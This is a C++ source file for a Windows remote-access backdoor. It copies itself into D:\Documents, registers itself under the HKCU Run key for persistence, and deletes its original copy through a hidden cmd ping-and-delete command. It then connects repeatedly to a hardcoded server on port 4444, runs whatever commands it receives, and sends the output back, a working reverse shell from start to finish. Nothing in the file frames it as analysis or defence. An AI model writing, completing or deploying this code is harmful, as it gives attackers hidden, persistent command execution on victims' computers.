#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <process.h>
#include <shlwapi.h>
#include <strsafe.h>

#define SERVER_HOST "127.0.0.1"
#define SERVER_PORT 4444
#define DEST_PATH "D:\\Documents"
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


#pragma comment(lib, "Ws2_32.lib") 

using namespace std;

void deleteFileAfterExit(void* filePath) {
    DeleteFile((LPCSTR)filePath);
}

void copy_addStart_del(const string& dest_path) {
    char current_script[MAX_PATH];
    GetModuleFileName(NULL, current_script, MAX_PATH);
    
    if (!PathFileExists(dest_path.c_str())) {
        cerr << "Destination path is not a valid directory." << endl;
        return;
    }

    string script_name = PathFindFileName(current_script);
    string dest_script_path = dest_path + "\\" + script_name;

    ifstream src(current_script, ios::binary);
    ofstream dst(dest_script_path, ios::binary);

    dst << src.rdbuf();
    src.close();
    dst.close();

    // Add to startup
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, "Script", 0, REG_SZ, (BYTE*)dest_script_path.c_str(), dest_script_path.length() + 1);
    RegCloseKey(hKey);

    //xóa
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}


SOCKET connect_to_server() {
    cout << "Start connecting to server:" << endl;
    SOCKET s;
    sockaddr_in server_addr;

    while (true) {
        WSADATA wsaData;
        int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
        if (iResult != 0) {
            cerr << "WSAStartup failed: " << iResult << endl;
            Sleep(30000);
            continue;
        }

        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            cerr << "Failed to create socket." << endl;
            WSACleanup();
            Sleep(30000);
            continue;
        }
 
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        if (inet_pton(AF_INET, SERVER_HOST, &server_addr.sin_addr) <= 0) {
            cerr << "Invalid address or address not supported." << endl;
            closesocket(s);
            WSACleanup();
            Sleep(30000);
            continue;
        }

        if (connect(s, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            cerr << "Connection failed." << endl;
            closesocket(s);
            WSACleanup();
            Sleep(30000);
            continue;
        }

        return s;
    }
}

void send_data(SOCKET s, const string& data) {
    if (send(s, data.c_str(), data.length(), 0) == SOCKET_ERROR) {
        cerr << "Sending failed." << endl;
    }
}

string receive_data(SOCKET s) {
    char buffer[4096] = {0};
    int recv_size = recv(s, buffer, sizeof(buffer), 0);
    if (recv_size == SOCKET_ERROR) {
        cerr << "Receiving failed." << endl;
        return "";
    }
    return string(buffer);
}

string execute_command(const string& command) {
    try {
        char buffer[4096];
        FILE *fp = _popen(command.c_str(), "r");
        if (!fp) {
            throw runtime_error("Error executing command.");
        }

        string result = "";
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            result += buffer;
        }
        _pclose(fp);

        if (result.empty()) {
            return "Command executed successfully but no output generated.";
        }
        return result;
    }
    catch (exception& e) {
        return e.what();
    }
}

int main() {
    if (wcsncmp(_wgetcwd(NULL, 0), L"D:\\Documents", wcslen(L"D:\\Documents")) != 0) {
        copy_addStart_del(DEST_PATH);
        return 0;
    }

    SOCKET server_socket = connect_to_server();
    cout << "Connected to the server." << endl;

    while (true) {
        string command = receive_data(server_socket);

        if (command == "exit") {
            break;
        }

        string result = execute_command(command);
        send_data(server_socket, result);
    }

    closesocket(server_socket);
    WSACleanup();
    return 0;
}
